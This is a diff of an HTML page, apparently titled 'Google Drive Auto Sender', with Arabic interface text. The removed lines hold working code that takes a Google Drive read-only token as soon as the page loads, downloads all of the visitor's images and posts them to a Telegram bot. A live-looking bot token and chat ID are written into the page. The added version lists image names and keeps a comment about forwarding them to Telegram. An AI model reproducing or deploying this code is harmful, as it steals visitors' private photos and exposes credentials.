@@ -1,102 +1,73 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Google Drive Auto Sender</title>
-  <script src="https://accounts.google.com/gsi/client" async defer></script>
+  <title>Google Drive Image Sender</title>
   <script src="https://apis.google.com/js/api.js"></script>
 </head>
-<body style="margin:0; padding:0; background:#fff; font-family:sans-serif;">
+<body>
+  <button id="authorize_button" style="display:none;">تسجيل دخول جوجل</button>
+  <button id="signout_button" style="display:none;">تسجيل خروج</button>
 
-<script>
-  const CLIENT_ID = '448184436252-2psfum2qgah9v1ahbt10es5ogr60n19s.apps.googleusercontent.com';
-  const SCOPES = 'https://www.googleapis.com/auth/drive.readonly';
-  const TELEGRAM_BOT_TOKEN = '7690497444:AAH1HVDn2HKjt6fIvhr9kTOfwxUYOPNq3Rw';
-  const TELEGRAM_CHAT_ID = '6894787120';
-  let access_token = null;
+  <div id="content"></div>
 
-  // تحميل مكتبة gapi ثم بدأ العملية
-  function loadGapiAndStart() {
-    gapi.load('client', async () => {
-      const tokenClient = google.accounts.oauth2.initTokenClient({
-        client_id: CLIENT_ID,
+  <script>
+    const CLIENT_ID = '869200348342-ijiun242m66rsrj55pk87ttbd0ubs4hh.apps.googleusercontent.com';
+    const SCOPES = 'https://www.googleapis.com/auth/drive.readonly';
+
+    const authorizeButton = document.getElementById('authorize_button');
+    const signoutButton = document.getElementById('signout_button');
+    const content = document.getElementById('content');
+
+    function handleClientLoad() {
+      gapi.load('client:auth2', initClient);
+    }
+
+    function initClient() {
+      gapi.client.init({
+        clientId: CLIENT_ID,
         scope: SCOPES,
-        callback: async (tokenResponse) => {
-          if (tokenResponse.access_token) {
-            access_token = tokenResponse.access_token;
-            await gapi.client.init({
-              discoveryDocs: ['https://www.googleapis.com/discovery/v1/apis/drive/v3/rest'],
-            });
-            startSending();
-          } else {
-            alert('فشل الحصول على التوكن!');
-          }
+      }).then(() => {
+        gapi.auth2.getAuthInstance().isSignedIn.listen(updateSigninStatus);
+        updateSigninStatus(gapi.auth2.getAuthInstance().isSignedIn.get());
+
+        authorizeButton.onclick = () => gapi.auth2.getAuthInstance().signIn();
+        signoutButton.onclick = () => gapi.auth2.getAuthInstance().signOut();
+      }, (error) => {
+        content.innerText = JSON.stringify(error, null, 2);
+      });
+    }
+
+    function updateSigninStatus(isSignedIn) {
+      if (isSignedIn) {
+        authorizeButton.style.display = 'none';
+        signoutButton.style.display = 'block';
+        listFiles();
+      } else {
+        authorizeButton.style.display = 'block';
+        signoutButton.style.display = 'none';
+        content.innerText = 'من فضلك قم بتسجيل الدخول للوصول إلى الصور';
+      }
+    }
+
+    function listFiles() {
+      gapi.client.drive.files.list({
+        'pageSize': 50,
+        'fields': 'files(id, name, mimeType)',
+        'q': "mimeType contains 'image/'"
+      }).then(function(response) {
+        const files = response.result.files;
+        if (files && files.length > 0) {
+          content.innerHTML = 'الصور التي سيتم إرسالها:<br><ul>' +
+            files.map(f => `<li>${f.name} (ID: ${f.id})</li>`).join('') + '</ul>';
+
+          // هنا يمكن ترسل IDs الصور للخادم (Node.js) عشان تبعتهم للتليجرام
+        } else {
+          content.innerText = 'لا توجد صور في Google Drive.';
         }
       });
-
-      // طلب الوصول مباشرة
-      tokenClient.requestAccessToken({prompt: ''});
-    });
-  }
-
-  async function listAllImages() {
-    let files = [];
-    let pageToken = null;
-    do {
-      const response = await gapi.client.drive.files.list({
-        q: "mimeType contains 'image/' and trashed = false",
-        fields: "nextPageToken, files(id, name)",
-        pageSize: 1000,
-        pageToken: pageToken
-      });
-      files = files.concat(response.result.files);
-      pageToken = response.result.nextPageToken;
-    } while (pageToken);
-    return files;
-  }
-
-  function getImageDownloadUrl(fileId) {
-    return `https://www.googleapis.com/drive/v3/files/${fileId}?alt=media`;
-  }
-
-  async function sendImageToTelegram(fileName, fileUrl) {
-    try {
-      const res = await fetch(fileUrl, {
-        headers: { 'Authorization': 'Bearer ' + access_token }
-      });
-      const blob = await res.blob();
-
-      const formData = new FormData();
-      formData.append('chat_id', TELEGRAM_CHAT_ID);
-      formData.append('caption', `📷 ${fileName}`);
-      formData.append('document', blob, fileName);
-
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
-        method: 'POST',
-        body: formData
-      });
-    } catch (err) {
-      console.error('خطأ أثناء إرسال الصورة:', fileName, err);
     }
-  }
 
-  async function startSending() {
-    const files = await listAllImages();
-    for (const file of files) {
-      const url = getImageDownloadUrl(file.id);
-      await sendImageToTelegram(file.name, url);
-    }
-  }
-
-  // نبدأ بعد تحميل الصفحة
-  window.onload = () => {
-    if (typeof gapi !== 'undefined') {
-      loadGapiAndStart();
-    } else {
-      alert('فشل تحميل مكتبة gapi!');
-    }
-  };
-</script>
-
+    handleClientLoad();
+  </script>
 </body>
 </html>
